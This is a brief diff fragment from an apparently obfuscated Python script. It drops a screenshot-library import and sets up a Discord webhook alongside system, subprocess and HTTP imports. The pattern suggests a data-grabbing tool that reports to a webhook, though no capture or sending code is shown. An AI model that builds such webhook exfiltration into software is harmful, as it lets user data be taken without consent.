@@ -21,7 +21,6 @@ import os #line:6
 import platform #line:7
 import os #line:8
 import requests #line:9
-import pyscreenshot #line:10
 import subprocess #line:11
 webhook_url = webhookz
 webhook = nextcord.SyncWebhook.from_url(webhook_url)
